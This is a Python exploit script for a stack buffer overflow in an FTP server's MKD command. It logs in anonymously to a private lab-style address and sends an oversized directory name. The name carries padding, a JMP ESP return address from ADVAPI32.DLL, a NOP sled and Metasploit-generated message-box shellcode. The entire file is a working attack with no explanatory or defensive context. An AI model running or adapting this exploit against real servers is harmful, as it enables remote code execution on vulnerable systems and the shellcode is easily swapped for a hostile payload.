#! /usr/bin/python

import socket
import sys
import struct

jmpesp=struct.pack("I",0x77DEF049) #ADVAPI32.DLL

#windows/messagebox msfpayload. BadChars 0x00,0x0A,0x0D
buf =  ""
buf += "\xd9\xea\xd9\x74\x24\xf4\xba\x7b\x20\x3a\xce\x5b\x29"
buf += "\xc9\xb1\x42\x31\x53\x17\x83\xc3\x04\x03\x28\x33\xd8"
buf += "\x3b\x17\xd8\x87\x1d\xd3\x3b\x4c\xac\xc9\xf6\xdb\xfe"
buf += "\x24\x92\xa8\x70\x86\xd0\xd9\x7e\x6d\x90\x39\xf4\x37"
buf += "\x55\xc9\x74\x97\xee\xfb\xb0\x98\xe8\x76\x32\x7f\x08"
buf += "\xa8\x4b\x9e\x6a\xc1\xd8\x44\x4f\x5e\x65\xb8\x04\x34"
buf += "\x4e\xb8\x1b\x5f\x05\x72\x04\x14\x40\xa2\x35\xc1\x96"
buf += "\x96\x7c\x9e\x6d\x5d\x7f\x4e\xbc\x9e\xb1\x4e\x43\xcc"
buf += "\x36\x8e\xc8\x0b\xf6\xc0\x3c\x12\x3f\x35\xca\x2f\xc3"
buf += "\xee\x1b\x3a\xda\x64\x01\xe0\x1d\x90\xd0\x63\x11\x2d"
buf += "\x96\x29\x36\xb0\x43\x46\x42\x39\x92\xb0\xc2\x79\xb1"
buf += "\x5c\xb4\x42\x0b\x54\x1f\x91\xe5\x81\xd6\xdb\x9e\xc7"
buf += "\xa7\xd5\xb2\x85\xdf\x75\xb5\xd6\xdf\x03\x0f\x2c\x9b"
buf += "\x6a\x48\xce\xa8\x15\x74\x2a\x1d\xf2\x0b\xcd\x5e\xfd"
buf += "\x9d\x74\xa9\x6a\xf2\x1a\x89\x2b\x62\xd1\xfb\x85\x16"
buf += "\x7d\x89\xaa\xb3\x0f\xf9\x11\x18\xe5\x70\x4f\x36\x06"
buf += "\xd7\x94\x3e\x3a\x88\x2f\xe8\x18\x64\xec\x6e\x40\x53"
buf += "\x5e\x99\x19\x64\xa1\xa6\xb1\xfe\x06\x79\x61\x97\xe6"
buf += "\x0e\x0f\x54\x36\x2a\x47\xc6\x1c\xc9\xde\x14\x34\xe2"
buf += "\xb8\xfa\xe5\x6c\x18\xbf\xd1\x1a\x30\x5b\x3a\x81\xb9"
buf += "\xcb\x6a\x32\x57\x69\xba\x75\x2f\x3d\x98\x88\xa6\x5f"
buf += "\xd1\x40\xea\xcc\x43\x37\xf5\x23\x52\x77\x59\x3b\xc0"
buf += "\x7f"

evil="A"*247+jmpesp+"\x90"*20+buf+"C"*442

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.102',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil +'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close()
